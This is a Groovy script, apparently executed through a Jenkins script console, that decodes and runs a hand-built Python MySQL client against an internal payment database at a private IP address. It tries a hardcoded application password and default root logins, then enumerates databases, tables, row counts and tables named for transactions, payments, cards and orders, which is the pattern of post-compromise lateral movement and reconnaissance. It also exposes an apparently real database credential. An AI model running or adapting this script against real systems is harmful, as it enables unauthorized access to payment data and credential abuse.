// MySQL directo desde Jenkins a T1Pagos 172.27.141.4:3306
// Python 2 compatible - sin f-strings, sin bytes()

def pyScript = r'''
import socket, struct, hashlib, sys

def recv_packet(s):
    h = b""
    while len(h) < 4:
        chunk = s.recv(4 - len(h))
        if not chunk: raise Exception("Connection closed in header")
        h += chunk
    plen = struct.unpack("<I", h[:3] + b"\x00")[0]
    data = b""
    while len(data) < plen:
        chunk = s.recv(min(65536, plen - len(data)))
        if not chunk: raise Exception("Connection closed in body")
        data += chunk
    return h[3:4], data

def mysql_hash(password, auth_data):
    if not password:
        return b""
    if isinstance(password, str):
        password = password.encode("latin1")
    h1 = hashlib.sha1(password).digest()
    h2 = hashlib.sha1(h1).digest()
    h12 = hashlib.sha1(auth_data + h2).digest()
    # Python 2/3 compatible XOR
    result = b""
    for i in range(len(h1)):
        if sys.version_info[0] >= 3:
            result += bytes([h1[i] ^ h12[i]])
        else:
            result += chr(ord(h1[i]) ^ ord(h12[i]))
    return result

def mysql_query(host, port, user, password, db, query):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(15)
    s.connect((host, port))
    
    seq, greeting = recv_packet(s)
    if greeting[0:1] == b"\xff":
        raise Exception("Server error: " + greeting[9:].decode("latin1"))
    
    # Parse greeting
    null_pos = greeting.index(b"\x00", 1)
    server_ver = greeting[1:null_pos].decode("latin1")
    # thread id
    thread_id = struct.unpack("<I", greeting[null_pos+1:null_pos+5])[0]
    # auth data part 1 (8 bytes)
    auth1 = greeting[null_pos+5:null_pos+13]
    # skip filler (1 byte) + capabilities (2 bytes) + charset (1 byte) + status (2 bytes) + cap_upper (2 bytes) + auth_data_len (1 byte) + reserved (10 bytes)
    offset = null_pos + 13
    offset += 1  # filler
    capabilities = struct.unpack("<H", greeting[offset:offset+2])[0]
    offset += 2  # capabilities
    offset += 1  # charset
    offset += 2  # status
    offset += 2  # capabilities upper
    auth_data_len_byte = struct.unpack("B", greeting[offset:offset+1])[0]
    offset += 1
    offset += 10  # reserved
    # auth data part 2
    auth2_len = max(13, auth_data_len_byte - 8)
    auth2 = greeting[offset:offset + auth2_len].rstrip(b"\x00")
    auth_data = auth1 + auth2
    
    pwd_hash = mysql_hash(password, auth_data)
    
    # Build login packet
    client_flags = 0x000FA685
    pkt = struct.pack("<IIB23s", client_flags, 16777216, 8, b"\x00"*23)
    if isinstance(user, str):
        user = user.encode("latin1")
    pkt += user + b"\x00"
    pkt += struct.pack("B", len(pwd_hash)) + pwd_hash
    if db:
        if isinstance(db, str):
            db = db.encode("latin1")
        pkt += db + b"\x00"
    else:
        pkt += b"\x00"
    
    s.sendall(struct.pack("<I", len(pkt))[:3] + b"\x01" + pkt)
    
    seq2, resp = recv_packet(s)
    if resp[0:1] == b"\xff":
        err = struct.unpack("<H", resp[1:3])[0]
        msg = resp[9:].decode("latin1", errors="replace")
        return None, "ERROR %d: %s" % (err, msg)
    
    print("AUTH OK MySQL %s (thread %d)" % (server_ver, thread_id))
    
    # Send query
    if isinstance(query, str):
        query = query.encode("utf-8")
    q_pkt = b"\x03" + query
    s.sendall(struct.pack("<I", len(q_pkt))[:3] + b"\x00" + q_pkt)
    
    # Read all response packets
    rows = []
    col_count = 0
    state = "meta"
    
    while True:
        try:
            s.settimeout(10)
            seq3, pkt = recv_packet(s)
        except:
            break
        
        if pkt[0:1] == b"\xff":
            err = struct.unpack("<H", pkt[1:3])[0]
            msg = pkt[9:].decode("latin1", errors="replace")
            return rows, "QUERY ERROR %d: %s" % (err, msg)
        
        if pkt[0:1] == b"\xfe" and len(pkt) < 9:
            if state == "cols":
                state = "rows"
                continue
            elif state == "rows":
                break
            continue
        
        if pkt[0:1] == b"\x00" and state == "meta":
            break
        
        if state == "meta":
            col_count = struct.unpack("B", pkt[0:1])[0]
            state = "cols"
            continue
        
        if state == "cols":
            continue
        
        if state == "rows":
            # Parse row
            pos = 0
            row = []
            while pos < len(pkt):
                b = pkt[pos:pos+1]
                if b == b"\xfb":
                    row.append("NULL")
                    pos += 1
                elif struct.unpack("B", b)[0] < 251:
                    flen = struct.unpack("B", b)[0]
                    val = pkt[pos+1:pos+1+flen].decode("utf-8", errors="replace")
                    row.append(val)
                    pos += 1 + flen
                elif struct.unpack("B", b)[0] == 252:
                    flen = struct.unpack("<H", pkt[pos+1:pos+3])[0]
                    val = pkt[pos+3:pos+3+flen].decode("utf-8", errors="replace")
                    row.append(val)
                    pos += 3 + flen
                elif struct.unpack("B", b)[0] == 253:
                    flen = struct.unpack("<I", pkt[pos+1:pos+4] + b"\x00")[0]
                    val = pkt[pos+4:pos+4+flen].decode("utf-8", errors="replace")
                    row.append(val)
                    pos += 4 + flen
                else:
                    break
            if row:
                rows.append(row)
    
    s.close()
    return rows, None

HOST = "172.27.141.4"
PORT = 3306

# Test multiple credentials
tests = [
    ("app_t1", "wUt22Us2CUh#+M=", "payment_t1", "SHOW TABLES"),
    ("root", "", "", "SHOW DATABASES"),
    ("root", "root", "", "SHOW DATABASES"),
]

working = None
for user, pwd, db, q in tests:
    print("\n=== Testing %s / '%s' ===" % (user, pwd[:10]))
    try:
        rows, err = mysql_query(HOST, PORT, user, pwd, db, q)
        if err:
            print("ERR: " + err)
        elif rows is not None:
            print("SUCCESS! %d rows" % len(rows))
            for r in rows[:30]:
                print("  " + " | ".join(r))
            working = (user, pwd)
            break
        else:
            print("OK, no result")
    except Exception as e:
        print("EXCEPTION: " + str(e))

if working:
    user, pwd = working
    print("\n\n=== USING %s - FULL ENUM ===" % user)
    
    # SHOW DATABASES
    rows, err = mysql_query(HOST, PORT, user, pwd, "", "SHOW DATABASES")
    print("\n--- DATABASES ---")
    if rows:
        for r in rows: print("  " + " | ".join(r))
    
    # payment_t1 tables
    rows2, err2 = mysql_query(HOST, PORT, user, pwd, "payment_t1", "SHOW TABLES")
    print("\n--- payment_t1 TABLES ---")
    if rows2:
        for r in rows2: print("  " + " | ".join(r))
    
    # Row counts
    rows3, _ = mysql_query(HOST, PORT, user, pwd, "", 
        "SELECT table_schema, table_name, table_rows FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','mysql','performance_schema') ORDER BY table_rows DESC LIMIT 30")
    print("\n--- TABLE ROW COUNTS (TOP 30) ---")
    if rows3:
        for r in rows3: print("  " + " | ".join(r))
    
    # Check payment data
    rows4, _ = mysql_query(HOST, PORT, user, pwd, "payment_t1", "SELECT * FROM information_schema.tables WHERE table_schema='payment_t1' AND table_name LIKE '%transaction%' OR table_name LIKE '%payment%' OR table_name LIKE '%card%' OR table_name LIKE '%order%' LIMIT 20")
    print("\n--- PAYMENT TABLES ---")
    if rows4:
        for r in rows4: print("  " + " | ".join(r))

print("\nDONE")
'''

def encoded = pyScript.bytes.encodeBase64().toString()
def cmd = ["bash", "-c", "echo '${encoded}' | base64 -d > /tmp/mysql_t1.py && python /tmp/mysql_t1.py 2>&1"]
def proc = cmd.execute()
def out = new StringBuilder()
def err = new StringBuilder()
proc.consumeProcessOutput(out, err)
proc.waitForOrKill(60000)
println out.toString()
if (err.toString()) println "STDERR: " + err.toString()
